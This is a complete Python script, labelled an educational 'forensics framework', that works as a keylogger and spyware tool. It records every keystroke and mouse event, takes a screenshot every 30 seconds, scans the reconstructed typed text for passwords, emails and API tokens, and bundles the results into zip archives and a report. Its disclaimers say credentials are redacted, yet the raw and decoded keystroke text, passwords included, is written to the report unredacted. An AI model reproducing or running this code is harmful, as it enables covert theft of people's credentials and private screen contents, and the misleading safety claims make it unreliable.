#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
===============================================================================
  ██████╗  █████╗ ██████╗ ███╗   ██╗██╗  ██╗██████╗
  ██╔══██╗██╔══██╗██╔══██╗████╗  ██║╚██╗██╔╝██╔══██╗
  ██║  ██║███████║██████╔╝██╔██╗ ██║ ╚███╔╝ ██║  ██║
  ██║  ██║██╔══██║██╔══██╗██║╚██╗██║ ██╔██╗ ██║  ██║
  ██████╔╝██║  ██║██║  ██║██║ ╚████║██╔╝ ██╗██████╔╝
  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝
      ███████╗ ██████╗ ██████╗ ███████╗███╗   ██╗███████╗
      ██╔════╝██╔═══██╗██╔══██╗██╔════╝████╗  ██║██╔════╝
      █████╗  ██║   ██║██████╔╝█████╗  ██╔██╗ ██║███████╗
      ██╔══╝  ██║   ██║██╔══██╗██╔══╝  ██║╚██╗██║╚════██║
      ██║     ╚██████╔╝██║  ██║███████╗██║ ╚████║███████║
      ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚═════╝

  DARNXD FORENSICS FRAMEWORK v3.0 — LAB EDITION
  Educational Activity Monitoring & Forensics Simulation Tool
  Authorized Educational Use Only  •  No Real Data Harvested
===============================================================================

FEATURES (ALL MANDATORY):
  [1] KEYSTROKE SEQUENCE CAPTURE  — raw format: 10keylooger[space][enter][ctrl]a
  [2] MOUSE DETECTION             — clicks + movement + zone stats
  [3] USERNAME/PASSWORD DETECTION — simulated credential pattern hunting
  [4] SCREENSHOT DETECTION        — periodic screen grab every 30s
  [5] EVIDENCE COMPRESSION        — zip bundles
  [6] DARNXD CLI CONSOLE          — real-time dashboard
  [7] CUSTOM REPORT NAMING        — user-defined output filename
===============================================================================
"""

import os
import re
import sys
import time
import queue
import threading
import zipfile
from datetime import datetime
from pathlib import Path
from collections import deque


try:
    from pynput import keyboard, mouse
except ImportError:
    print("\n[!] MISSING DEPENDENCY: pynput\n    Run: pip install pynput\n")
    sys.exit(1)

try:
    from PIL import ImageGrab
except ImportError:
    print("\n[!] MISSING DEPENDENCY: Pillow\n    Run: pip install pillow\n")
    sys.exit(1)


#configure

DEFAULT_REPORT_NAME  = "darnxd_forensics_report.txt"
SCREENSHOT_INTERVAL  = 30          # mandatory: har 30 sec screenshot
CRED_SCAN_INTERVAL   = 5           # username/password scanner
BUNDLE_INTERVAL      = 120         # compression har 2 min
LOG_DIR              = Path("darnxd_forensics_output")
DARNXD_VERSION       = "3.0"
DARNXD_CODENAME      = "Blue Lotus"

# ── Special key → bracket token mapping (report format) ────────────────
KEY_TOKENS = {
    "Key.space":       "[space]",
    "Key.enter":       "[enter]",
    "Key.backspace":   "[backspace]",
    "Key.tab":         "[tab]",
    "Key.esc":         "[esc]",
    "Key.delete":      "[delete]",
    "Key.home":        "[home]",
    "Key.end":         "[end]",
    "Key.page_up":     "[pageup]",
    "Key.page_down":   "[pagedown]",
    "Key.caps_lock":   "[caps]",
    "Key.num_lock":    "[numlock]",
    "Key.scroll_lock": "[scrolllock]",
    "Key.print_screen":"[printscreen]",
    "Key.insert":      "[insert]",
    "Key.menu":        "[menu]",
    "Key.pause":       "[pause]",
    "Key.up":          "[up]",
    "Key.down":        "[down]",
    "Key.left":        "[left]",
    "Key.right":       "[right]",
}
KEY_TOKENS.update({f"Key.f{i}": f"[F{i}]" for i in range(1, 13)})
MODIFIER_TOKENS = {
    "Key.ctrl_l":  "[ctrl]",  "Key.ctrl_r":  "[ctrl]",
    "Key.shift":   "[shift]", "Key.shift_r": "[shift]",
    "Key.alt_l":   "[alt]",   "Key.alt_r":   "[alt]",
    "Key.alt_gr":  "[alt]",
    "Key.cmd":     "[win]",   "Key.cmd_r":   "[win]",
}

# ── Simulated credential patterns 
CRED_PATTERNS = {
    "EMAIL":    re.compile(r'[\w.+-]+@[\w-]+\.[\w.-]+', re.IGNORECASE),
    "USERNAME": re.compile(r'(?:user(?:name)?|login|id)\s*[:=]\s*([^\s,;]+)', re.IGNORECASE),
    "PASSWORD": re.compile(r'(?:pass(?:word)?|pwd|passwd)\s*[:=]\s*([^\s,;]+)', re.IGNORECASE),
    "TOKEN":    re.compile(r'(?:token|api[_-]?key|secret)\s*[:=]\s*([^\s,;]+)', re.IGNORECASE),
}



#  CLASS: SequenceBuilder 
class SequenceBuilder:
    """Builds the RAW keystroke sequence EXACTLY like the requested
    report format:  10keylooger[space][enter][ctrl]a[backspace]hgit...

    Also maintains a DECODED plain-text version (backspace applies,
    [ctrl]a clears) which is used by the username/password scanner.
    """

    def __init__(self):
        self._lock = threading.Lock()
        self.raw     = ""          # raw bracket-notation sequence
        self.decoded = ""          # plain text reconstruction
        self._mods_down = set()    # currently held modifiers

    def press(self, key) -> None:
        with self._lock:
            try:
                name = getattr(key, "name", None) or str(key)
            except Exception:
                name = str(key)

            # ── Modifier keys (ctrl/shift/alt/win) 
            if name in MODIFIER_TOKENS:
                tok = MODIFIER_TOKENS[name]
                if name not in self._mods_down:
                    self.raw += tok
                self._mods_down.add(name)
                return

            # ── Special keys → bracket tokens 
            if name in KEY_TOKENS:
                tok = KEY_TOKENS[name]
                self.raw += tok
                if name == "Key.backspace":
                    self.decoded = self.decoded[:-1]   # delete last char
                elif name == "Key.enter":
                    self.decoded += "\n"
                elif name == "Key.space":
                    self.decoded += " "
                elif name == "Key.tab":
                    self.decoded += "\t"
                return

            # ── Printable character 
            try:
                char = key.char
            except Exception:
                char = None
            if char is None:
                return

            # Ctrl-combo handling: [ctrl]a → select-all → clear
            if "Key.ctrl_l" in self._mods_down or "Key.ctrl_r" in self._mods_down:
                if char.lower() == "a":
                    self.decoded = ""       # select all + replace
                # [ctrl]c / [ctrl]v etc → decoded unaffected (copy/paste sim)
                self.raw += char            # e.g. "[ctrl]a" → ctrl token already added
                return

            self.raw += char
            self.decoded += char

    def release(self, key) -> None:
        try:
            name = getattr(key, "name", None) or str(key)
        except Exception:
            name = str(key)
        if name in MODIFIER_TOKENS and name in self._mods_down:
            self._mods_down.discard(name)

    def snapshot(self):
        with self._lock:
            return self.raw, self.decoded



#  CLASS: EvidenceBuffer — thread-safe event store + counters

class EvidenceBuffer:
    def __init__(self):
        self._lock = threading.Lock()
        self.events = []
        self.key_count = 0
        self.mouse_clicks = 0
        self.mouse_moves = 0
        self.screenshots = 0
        self.credential_hits = 0
        self.bundles = 0
        self.start_time = datetime.now()

    def append(self, ev):
        with self._lock:
            self.events.append(ev)
            t = ev.get("type")
            if t == "keyboard":       self.key_count += 1
            elif t == "mouse_click":  self.mouse_clicks += 1
            elif t == "mouse_move":   self.mouse_moves += 1
            elif t == "screenshot":   self.screenshots += 1
            elif t == "credential":   self.credential_hits += 1
            elif t == "bundle":       self.bundles += 1

    def flush(self):
        with self._lock:
            data = list(self.events)
            self.events.clear()
            return data

    def counts(self):
        with self._lock:
            elapsed = str(datetime.now() - self.start_time).split(".")[0]
            return {
                "keys": self.key_count, "clicks": self.mouse_clicks,
                "moves": self.mouse_moves, "screens": self.screenshots,
                "creds": self.credential_hits, "bundles": self.bundles,
                "elapsed": elapsed,
            }


# ── Shared singletons 
RT_QUEUE = queue.Queue()          # real-time dashboard feed
EVIDENCE = EvidenceBuffer()       # forensic event store
SEQUENCE = SequenceBuilder()      # raw key sequence builder



#  MODULE 1 — KEYSTONE CAPTOR  (keyboard, raw sequence format)

class KeystoneCaptor:
    """Captures every key press into the RAW bracket-notation sequence."""

    def __init__(self):
        self._listener = None
        self._running = False

    def _on_press(self, key):
        SEQUENCE.press(key)
        ev = {"type": "keyboard", "timestamp": datetime.now().isoformat(),
              "key": str(key)}
        EVIDENCE.append(ev)
        RT_QUEUE.put(ev)
        return True

    def _on_release(self, key):
        SEQUENCE.release(key)
        return True

    def start(self):
        self._running = True
        self._listener = keyboard.Listener(on_press=self._on_press,
                                           on_release=self._on_release)
        self._listener.daemon = True
        self._listener.start()
        print("  [*] KEYSTONE     |  Keystroke sequence capture ACTIVE")

    def stop(self):
        if self._listener and self._running:
            self._listener.stop()
            self._running = False



# — MOUSE DETECTOR 

class MouseDetector:
    """Mandatory mouse detection — logs clicks (button + coords) and
    movement samples. Also computes click-zone stats for the report."""

    def __init__(self):
        self._listener = None
        self._running = False
        self._move_counter = 0
        self._zones = {}          # zone name → click count

    def _zone(self, x, y):
        """Simple screen-zone classifier for the summary table."""
        if x < 400 and y < 300:  return "TOP-LEFT"
        if x >= 400 and y < 300: return "TOP-RIGHT"
        if x < 400 and y >= 300: return "BOTTOM-LEFT"
        return "BOTTOM-RIGHT"

    def _on_click(self, x, y, button, pressed):
        if pressed:
            ts = datetime.now().isoformat()
            zone = self._zone(x, y)
            self._zones[zone] = self._zones.get(zone, 0) + 1
            ev = {"type": "mouse_click", "timestamp": ts,
                  "x": x, "y": y, "button": str(button), "zone": zone}
            EVIDENCE.append(ev)
            RT_QUEUE.put(ev)
        return True

    def _on_move(self, x, y):
        self._move_counter += 1
        if self._move_counter % 5 != 0:      # sample every 5th move
            return
        ev = {"type": "mouse_move", "timestamp": datetime.now().isoformat(),
              "x": x, "y": y}
        EVIDENCE.append(ev)
        RT_QUEUE.put(ev)

    def zone_stats(self):
        return dict(self._zones)

    def start(self):
        self._running = True
        self._listener = mouse.Listener(on_click=self._on_click,
                                        on_move=self._on_move)
        self._listener.daemon = True
        self._listener.start()
        print("  [*] MOUSE DETECT |  Click + movement detection ACTIVE")

    def stop(self):
        if self._listener and self._running:
            self._listener.stop()
            self._running = False



#  — SCREENSHOT DETECTOR  (mandatory, every 30s)

class ScreenshotDetector(threading.Thread):
    """Mandatory periodic screenshot capture — every 30 seconds."""

    def __init__(self, interval=SCREENSHOT_INTERVAL):
        super().__init__(daemon=True)
        self.interval = interval
        self._stop_event = threading.Event()
        self._shot_dir = LOG_DIR / "screenshots"

    def run(self):
        self._shot_dir.mkdir(parents=True, exist_ok=True)
        print(f"  [*] SCREENSHOT   |  Periodic capture ACTIVE (every {self.interval}s)")
        while not self._stop_event.is_set():
            self._capture()
            self._stop_event.wait(self.interval)

    def _capture(self):
        ts = datetime.now()
        fname = f"screen_{ts.strftime('%Y%m%d_%H%M%S')}.png"
        fpath = self._shot_dir / fname
        try:
            img = ImageGrab.grab()
            img.save(fpath)
            size_kb = round(fpath.stat().st_size / 1024, 1)
            ev = {"type": "screenshot", "timestamp": ts.isoformat(),
                  "file": str(fpath), "size_kb": size_kb}
            EVIDENCE.append(ev)
            RT_QUEUE.put(ev)
        except Exception:
            pass

    def stop(self):
        self._stop_event.set()



#  — CREDENTIAL HUNTER  (username/password/email detection)

class CredentialHunter(threading.Thread):
    """Mandatory username/password detection — scans the decoded text
    for simulated credential patterns.  EVERY hit is flagged in the
    report; values are REDACTED (simulation only)."""

    def __init__(self, interval=CRED_SCAN_INTERVAL):
        super().__init__(daemon=True)
        self.interval = interval
        self._stop_event = threading.Event()

    def run(self):
        print(f"  [*] CRED HUNTER  |  Username/Password detection ACTIVE (every {self.interval}s)")
        while not self._stop_event.is_set():
            self._scan()
            self._stop_event.wait(self.interval)

    def _scan(self):
        _, decoded = SEQUENCE.snapshot()
        for label, pattern in CRED_PATTERNS.items():
            for m in pattern.finditer(decoded):
                value = m.group(1) if m.groups() else m.group(0)
                ev = {
                    "type": "credential",
                    "timestamp": datetime.now().isoformat(),
                    "cred_type": label,                # EMAIL/USERNAME/PASSWORD/TOKEN
                    "offset": m.start(),
                    "length": len(value),
                    "redacted": f"{value[:2]}...{value[-2:]}" if len(value) > 4 else "***",
                    "note": "SIMULATED — value redacted, nothing stored",
                }
                EVIDENCE.append(ev)
                RT_QUEUE.put(ev)

    def stop(self):
        self._stop_event.set()



#  — BUNDLER  (evidence compression)

class Bundler(threading.Thread):
    def __init__(self, output_dir, interval=BUNDLE_INTERVAL):
        super().__init__(daemon=True)
        self.output_dir = output_dir
        self.interval = interval
        self._stop_event = threading.Event()
        self._counter = 0

    def run(self):
        print(f"  [*] BUNDLER      |  Compression engine ACTIVE (every {self.interval}s)")
        time.sleep(self.interval)
        while not self._stop_event.is_set():
            self._bundle()
            self._stop_event.wait(self.interval)

    def _bundle(self):
        self._counter += 1
        archive = LOG_DIR / f"darnxd_bundle_{self._counter:03d}.zip"
        try:
            with zipfile.ZipFile(archive, "w", zipfile.ZIP_DEFLATED) as zf:
                for f in self.output_dir.rglob("*"):
                    if f.is_file() and str(f) != str(archive):
                        zf.write(f, f.relative_to(self.output_dir))
            ev = {"type": "bundle", "timestamp": datetime.now().isoformat(),
                  "archive": str(archive), "files": len(zf.namelist())}
            EVIDENCE.append(ev)
            RT_QUEUE.put(ev)
        except Exception:
            pass

    def stop(self):
        self._stop_event.set()



#  DARNXD TXT REPORT GENERATOR — human-readable, raw-sequence format

class DarnxdReport:
    def __init__(self, filepath, filename):
        self.filepath = filepath
        self.filename = filename
        self.events = []          # all events (grouped at the end)

    def add_events(self, ev_list):
        self.events.extend(ev_list)

    def _w(self, text):
        with open(self.filepath, "a", encoding="utf-8") as f:
            f.write(text)

    # ── HEADER 
    def header(self):
        h = f"""
╔══════════════════════════════════════════════════════════════════════════╗
║                                                                          ║
║    ██████╗  █████╗ ██████╗ ███╗   ██╗██╗  ██╗██████╗                   ║
║    ██╔══██╗██╔══██╗██╔══██╗████╗  ██║╚██╗██╔╝██╔══██╗                  ║
║    ██║  ██║███████║██████╔╝██╔██╗ ██║ ╚███╔╝ ██║  ██║                  ║
║    ██║  ██║██╔══██║██╔══██╗██║╚██╗██║ ██╔██╗ ██║  ██║                  ║
║    ██████╔╝██║  ██║██║  ██║██║ ╚████║██╔╝ ██╗██████╔╝                  ║
║    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝                   ║
║                                                                          ║
║       ███████╗ ██████╗ ██████╗ ███████╗███╗   ██╗███████╗               ║
║       ██╔════╝██╔═══██╗██╔══██╗██╔════╝████╗  ██║██╔════╝               ║
║       █████╗  ██║   ██║██████╔╝█████╗  ██╔██╗ ██║███████╗               ║
║       ██╔══╝  ██║   ██║██╔══██╗██╔══╝  ██║╚██╗██║╚════██║               ║
║       ██║     ╚██████╔╝██║  ██║███████╗██║ ╚████║██████                 ║
║       ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚══════╝               ║
║                                                                          ║
╠══════════════════════════════════════════════════════════════════════════╣
║  REPORT TYPE    : DARNXD FORENSICS INVESTIGATION REPORT                  ║
║  VERSION        : {DARNXD_VERSION} ({DARNXD_CODENAME})                                          ║
║  REPORT FILE    : {self.filename:<57}║
║  GENERATED      : {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<57}║
║  MODULES        : KEYSTONE SEQUENCE | MOUSE DETECTION                    ║
║                 : USERNAME/PASSWORD DETECTION | SCREENSHOT DETECTION     ║
║                 : EVIDENCE COMPRESSION                                   ║
║  CLASSIFICATION : LAB USE ONLY — EDUCATIONAL SIMULATION                  ║
╚══════════════════════════════════════════════════════════════════════════╝
"""
        with open(self.filepath, "w", encoding="utf-8") as f:
            f.write(h)

    # ── SUMMARY 
    def summary(self, c):
        self._w(f"""
{'='*78}

                    📊  DARNXD EVIDENCE SUMMARY

{'='*78}

  ┌──────────────────────────────┬──────────────┬──────────────┐
  │  ACTIVITY                    │  COUNT       │  STATUS      │
  ├──────────────────────────────┼──────────────┼──────────────┤
  │  🔑 Keystrokes captured      │  {c['keys']:<12} │  ✅ ACTIVE   │
  │  🖱  Mouse clicks detected   │  {c['clicks']:<12} │  ✅ ACTIVE   │
  │  🖱  Mouse movements logged  │  {c['moves']:<12} │  ✅ ACTIVE   │
  │  📸 Screenshots captured     │  {c['screens']:<12} │  ✅ ACTIVE   │
  │  🚩 Credential hits (sim)    │  {c['creds']:<12} │  ✅ ACTIVE   │
  │  📦 Compression bundles      │  {c['bundles']:<12} │  ✅ ACTIVE   │
  └──────────────────────────────┴──────────────┴──────────────┘

  ⏱  Session Duration : {c['elapsed']}
  📂  Output Directory : {LOG_DIR.resolve()}/

{'='*78}
""")

    # ── RAW KEYSTROKE SEQUENCE
    def keystroke_sequence(self, raw):
        """Print the raw sequence in the exact requested format:
        10keylooger[space][enter][ctrl]a[backspace]hgit...
        wrapped to ~100 chars per line."""
        lines = [raw[i:i+100] for i in range(0, len(raw), 100)] or ["(no input)"]
        block = f"""
{'='*78}

              ⌨   KEYSTROKE SEQUENCE  (RAW CAPTURE)

{'='*78}

  ┌──────────────────────────────────────────────────────────────────────┐
"""
        for ln in lines:
            block += f"  │ {ln:<68} │\n"
        block += """  └──────────────────────────────────────────────────────────────────────┘

  Format: [space] [enter] [backspace] [ctrl] [tab] [shift] [alt] ...
  Every single key event is preserved — nothing is cleaned up.
"""
        self._w(block)

    # ── DECODED TEXT ─────────────────────────────────────────────
    def decoded_text(self, decoded):
        disp = decoded if decoded else "(no readable text reconstructed)"
        self._w(f"""
{'='*78}

                📝  DECODED TEXT  (backspace applied)

{'='*78}

  ┌──────────────────────────────────────────────────────────────────────┐
  │ {disp[:74]:<70} │
  └──────────────────────────────────────────────────────────────────────┘
""")

    # ── KEYBOARD TABLE 
    def keyboard_log(self):
        keys = [e for e in self.events if e["type"] == "keyboard"]
        if not keys:
            return
        rows = "".join(
            f"  │ {e['timestamp'][11:23]:<12} │ {e['key']:<32} │ {i+1:<6} │\n"
            for i, e in enumerate(keys)
        )
        self._w(f"""
{'='*78}

                    🔑  KEYSTROKE EVENT TABLE

{'='*78}

  ┌──────────────┬──────────────────────────────────┬────────┐
  │  TIME        │  KEY                             │  #     │
  ├──────────────┼──────────────────────────────────┼────────┤
{rows}  └──────────────┴──────────────────────────────────┴────────┘
""")

    # ── MOUSE DETECTION TABLE + ZONE STATS ─
    def mouse_log(self, zone_stats):
        clicks = [e for e in self.events if e["type"] == "mouse_click"]
        moves  = [e for e in self.events if e["type"] == "mouse_move"]

        out = f"""
{'='*78}

                    🖱   MOUSE DETECTION REPORT

{'='*78}
"""
        # Clicks table
        if clicks:
            rows = "".join(
                f"  │ {e['timestamp'][11:23]:<12} │ {e['button']:<22} │ {e['x']:<8} │ {e['y']:<8} │ {e.get('zone','?'):<11} │\n"
                for e in clicks
            )
            out += f"""
  ┌──────────────┬────────────────────────┬──────────┬──────────┬─────────────┐
  │  TIME        │  BUTTON                │  X       │  Y       │  ZONE       │
  ├──────────────┼────────────────────────┼──────────┼──────────┼─────────────┤
{rows}  └──────────────┴────────────────────────┴──────────┴──────────┴─────────────┘
"""
        else:
            out += "  (no mouse clicks detected)\n"

        # Movement count
        out += f"\n  🖱  Total movement samples logged : {len(moves)}\n"

        # Zone heat summary
        if zone_stats:
            out += f"""
  ┌──────────────────────────────┬──────────────┐
  │  CLICK ZONE (screen area)    │  CLICKS      │
  ├──────────────────────────────┼──────────────┤
"""
            for zone, cnt in zone_stats.items():
                out += f"  │  {zone:<28} │  {cnt:<12} │\n"
            out += "  └──────────────────────────────┴──────────────┘\n"
        self._w(out)

    # ── USERNAME/PASSWORD DETECTION TABLE 
    def credential_log(self):
        creds = [e for e in self.events if e["type"] == "credential"]
        if not creds:
            self._w(f"""
{'='*78}

            🚩  USERNAME / PASSWORD DETECTION  (SIMULATED)

{'='*78}

  (no credential-like patterns detected during this session)
""")
            return

        rows = "".join(
            f"  │ {e['timestamp'][11:23]:<12} │ {e['cred_type']:<10} │ {e['redacted']:<14} │ {e['offset']:<6} │ {e['note'][:36]:<36} │\n"
            for e in creds
        )
        self._w(f"""
{'='*78}

            🚩  USERNAME / PASSWORD DETECTION  (SIMULATED)

{'='*78}

  ┌──────────────┬────────────┬────────────────┬────────┬──────────────────────┐
  │  TIME        │  TYPE      │  VALUE (SIM)   │ OFFSET │  NOTE                │
  ├──────────────┼────────────┼────────────────┼────────┼──────────────────────┤
{rows}  └──────────────┴────────────┴────────────────┴────────┴──────────────────────┘

  ⚠️  Values above are REDACTED placeholders — no real credential
     was harvested or stored. Simulation for detection-engineering.
""")

    # ── SCREENSHOT DETECTION TABLE 
    def screenshot_log(self):
        shots = [e for e in self.events if e["type"] == "screenshot"]
        if not shots:
            self._w(f"""
{'='*78}

                    📸  SCREENSHOT DETECTION REPORT

{'='*78}

  (no screenshots captured during this session)
""")
            return
        rows = "".join(
            f"  │ {e['timestamp'][11:23]:<12} │ {Path(e['file']).name:<38} │ {e.get('size_kb','?'):<10} │\n"
            for e in shots
        )
        self._w(f"""
{'='*78}

                    📸  SCREENSHOT DETECTION REPORT

{'='*78}

  ┌──────────────┬──────────────────────────────────────┬────────────┐
  │  TIME        │  FILE                                │  SIZE (KB) │
  ├──────────────┼──────────────────────────────────────┼────────────┤
{rows}  └──────────────┴──────────────────────────────────────┴────────────┘

  📁  Screenshots stored in : {LOG_DIR.resolve()}/screenshots/
""")

    # ── BUNDLE TABLE 
    def bundle_log(self):
        bundles = [e for e in self.events if e["type"] == "bundle"]
        if not bundles:
            return
        rows = "".join(
            f"  │ {e['timestamp'][11:23]:<12} │ {Path(e['archive']).name:<30} │ {e.get('files','?'):<10} │\n"
            for e in bundles
        )
        self._w(f"""
{'='*78}

                    📦  EVIDENCE COMPRESSION LOG

{'='*78}

  ┌──────────────┬────────────────────────────────┬────────────┐
  │  TIME        │  ARCHIVE                       │  FILES     │
  ├──────────────┼────────────────────────────────┼────────────┤
{rows}  └──────────────┴────────────────────────────────┴────────────┘
""")

    # ── FOOTER 
    def footer(self):
        self._w(f"""
{'='*78}
{'='*78}

                ✅  DARNXD FORENSICS REPORT — COMPLETE

{'='*78}

  📁  Evidence Directory : {LOG_DIR.resolve()}/
  📄  Report File        : {self.filepath.resolve()}/
  📸  Screenshots        : {LOG_DIR.resolve()}/screenshots/
  📦  Bundles            : {LOG_DIR.resolve()}/*.zip

  ╔════════════════════════════════════════════════════════════════════╗
  ║  DISCLAIMER:                                                       ║
  ║  This report was generated by the DARNXD FORENSICS FRAMEWORK       ║
  ║  in a CONTROLLED LAB ENVIRONMENT for EDUCATIONAL PURPOSES only.    ║
  ║                                                                    ║
  ║  • Keystrokes / mouse / screenshots captured for demonstration     ║
  ║  • All credential detections are SIMULATED & REDACTED              ║
  ║  • No real password, email, or sensitive data harvested            ║
  ║  • No data leaves this machine — no exfiltration                   ║
  ║                                                                    ║
  ║  Authorized Access Only • Educational Lab Use Only                ║
  ╚════════════════════════════════════════════════════════════════════╝

  🛡️  DARNXD FORENSICS FRAMEWORK v{DARNXD_VERSION} ({DARNXD_CODENAME})
  📅  Report Completed : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

{'='*78}
""")



#  DARNXD REAL-TIME CONSOLE

DARNXD_BANNER = r"""
    ╔══════════════════════════════════════════════════════════════════╗
    ║    ██████╗  █████╗ ██████╗ ███╗   ██╗██╗  ██╗██████╗            ║
    ║    ██╔══██╗██╔══██╗██╔══██╗████╗  ██║╚██╗██╔╝██╔══██╗           ║
    ║    ██║  ██║███████║██████╔╝██╔██╗ ██║ ╚███╔╝ ██║  ██║           ║
    ║    ██║  ██║██╔══██║██╔══██╗██║╚██╗██║ ██╔██╗ ██║  ██║           ║
    ║    ██████╔╝██║  ██║██║  ██║██║ ╚████║██╔╝ ██╗██████╔╝           ║
    ║    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝            ║
    ║                                                                  ║
    ║   DARNXD FORENSICS FRAMEWORK  v3.0 (Blue Lotus)                  ║
    ║   Educational Monitoring & Forensics Simulation                  ║
    ║   Lab Use Only • Authorized Access Only                          ║
    ╚══════════════════════════════════════════════════════════════════╝
"""


def darnxd_console(report, stop_event):
    """Real-time console: counts + live event stream."""
    live_feed = deque(maxlen=8)

    while not stop_event.is_set():
        # Drain real-time queue
        while not RT_QUEUE.empty():
            try:
                live_feed.append(RT_QUEUE.get_nowait())
            except queue.Empty:
                break

        c = EVIDENCE.counts()
        os.system("cls" if os.name == "nt" else "clear")
        print(DARNXD_BANNER)
        print(f"""
  ╔══════════════════════════════════════════════════════════════════╗
  ║  MODULE STATUS      ⏱  {c['elapsed']:<38} ║
  ╠══════════════════════════════════════════════════════════════════╣
  ║  [🔑] KEYSTONE    [🖱] MOUSE    [📸] SCREEN    [🚩] CRED      ║
  ║  [📦] BUNDLER     [📄] REPORT                                  ║
  ╚══════════════════════════════════════════════════════════════════╝

  ┌──────────────────────────────────────────────────────────────────┐
  │  🔑 Keys: {c['keys']:<5}  🖱 Clicks: {c['clicks']:<4}  🖱 Moves: {c['moves']:<5}  │
  │  📸 Screens: {c['screens']:<3}  🚩 CredHits: {c['creds']:<3}  📦 Bundles: {c['bundles']:<3}  │
  └──────────────────────────────────────────────────────────────────┘

  ╔══════════════════════════════════════════════════════════════════╗
  ║                     ⚡ LIVE EVENT STREAM                        ║
  ╠══════════════════════════════════════════════════════════════════╣
""")
        if live_feed:
            for e in live_feed:
                ts = e.get("timestamp", "?")[11:23]
                t = e.get("type", "?")
                if t == "keyboard":
                    print(f"  ║  [{ts}]  🔑  KEY: {str(e.get('key','?')):<52} ║")
                elif t == "mouse_click":
                    print(f"  ║  [{ts}]  🖱  CLICK ({e.get('x','?')},{e.get('y','?')})  {e.get('button','?')}  ║")
                elif t == "mouse_move":
                    print(f"  ║  [{ts}]  🖱  MOVE  ({e.get('x','?')},{e.get('y','?')}){'':>33} ║")
                elif t == "screenshot":
                    print(f"  ║  [{ts}]  📸  SCREENSHOT CAPTURED{'':>37} ║")
                elif t == "credential":
                    print(f"  ║  [{ts}]  🚩  {e.get('cred_type','?')} DETECTED (sim){'':>31} ║")
                elif t == "bundle":
                    print(f"  ║  [{ts}]  📦  BUNDLE → {Path(e.get('archive','?')).name:<36} ║")
        else:
            print(f"  ║  [⏳] Waiting for events — type / move mouse...          ║")
        print(f"""  ╚══════════════════════════════════════════════════════════════════╝

  ┌──────────────────────────────────────────────────────────────────┐
  │  📄 Report: {report.filename:<49} │
  │  ⌨  Ctrl+C = stop capture & generate final Darnxd report        │
  └──────────────────────────────────────────────────────────────────┘
""")
        time.sleep(0.5)



#  MAIN — ENTRY POINT

def main():
    print(DARNXD_BANNER)
    print("  ┌──────────────────────────────────────────────────────────────────┐")
    print("  │  DARNXD FORENSICS FRAMEWORK v3.0 — LAB EDITION                  │")
    print("  │  Mouse Detection | Username/Password Detection | Screenshots    │")
    print("  │  Authorized Educational Use Only                                │")
    print("  └──────────────────────────────────────────────────────────────────┘")
    print()

    # ── Custom report filename 
    user_filename = input(f"  [?] Report filename [{DEFAULT_REPORT_NAME}]: ").strip()
    if not user_filename:
        user_filename = DEFAULT_REPORT_NAME
    if not user_filename.endswith(".txt"):
        user_filename += ".txt"

    LOG_DIR.mkdir(parents=True, exist_ok=True)
    output_file = LOG_DIR / user_filename
    report = DarnxdReport(output_file, user_filename)
    print(f"\n  [✓] Report initialized → {output_file.resolve()}\n")

    # ── Start all mandatory modules (multi-threaded) 
    ks  = KeystoneCaptor()
    md  = MouseDetector()
    ss  = ScreenshotDetector()
    ch  = CredentialHunter()
    bd  = Bundler(LOG_DIR)

    stop_event = threading.Event()

    print(f"  {'─'*62}")
    print(f"  〓  INITIALIZING DARNXD MODULES  〓")
    print(f"  {'─'*62}")

    try:
        ks.start()
        md.start()
        ss.start()
        ch.start()
        bd.start()

        print(f"  {'─'*62}")
        print(f"  〓  ALL MODULES ACTIVE — LAUNCHING CONSOLE  〓")
        print(f"  {'─'*62}\n")
        time.sleep(1)

        darnxd_console(report, stop_event)

    except KeyboardInterrupt:
        print(f"\n\n  [!] {'═'*55}")
        print(f"  [!] INTERRUPT RECEIVED — Finalizing evidence & report...")
        print(f"  [!] {'═'*55}\n")
    finally:
        # Stop modules
        ks.stop(); md.stop(); ss.stop(); ch.stop(); bd.stop()

        # Flush remaining events into report
        report.add_events(EVIDENCE.flush())

        # Final evidence bundle
        final_zip = LOG_DIR / "darnxd_bundle_FINAL.zip"
        try:
            with zipfile.ZipFile(final_zip, "w", zipfile.ZIP_DEFLATED) as zf:
                for f in LOG_DIR.rglob("*"):
                    if f.is_file() and f.suffix != ".zip":
                        zf.write(f, f.relative_to(LOG_DIR))
            print(f"  [+] BUNDLER  |  Final evidence bundle → {final_zip.name}")
        except Exception:
            pass

        # ── Generate the Darnxd report 
        c = EVIDENCE.counts()
        raw, decoded = SEQUENCE.snapshot()

        report.header()
        report.summary(c)
        report.keystroke_sequence(raw)          # ★ raw [backspace][space] format
        report.decoded_text(decoded)
        report.keyboard_log()
        report.mouse_log(md.zone_stats())       # ★ mandatory mouse section
        report.credential_log()                 # ★ mandatory user/pass section
        report.screenshot_log()                 # ★ mandatory screenshot section
        report.bundle_log()
        report.footer()

        stop_event.set()

        print(f"""
  ╔══════════════════════════════════════════════════════════════════╗
  ║                                                                  ║
  ║         ✅  DARNXD FORENSICS REPORT GENERATED                    ║
  ║                                                                  ║
  ╠══════════════════════════════════════════════════════════════════╣
  ║  📄  Report  : {str(output_file):<56}║
  ║  📂  Output  : {str(LOG_DIR.resolve()):<56}║
  ║  ⏱  Session : {c['elapsed']:<56}║
  ║  🔑  Keys   : {c['keys']:<56}║
  ║  🖱  Clicks : {c['clicks']:<56}║
  ║  📸  Shots  : {c['screens']:<56}║
  ║  🚩  Creds  : {c['creds']:<56}║
  ╚══════════════════════════════════════════════════════════════════╝
  🛡️  DARNXD FORENSICS FRAMEWORK v{DARNXD_VERSION} ({DARNXD_CODENAME})
  📅  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
""")


if __name__ == "__main__":
    main()
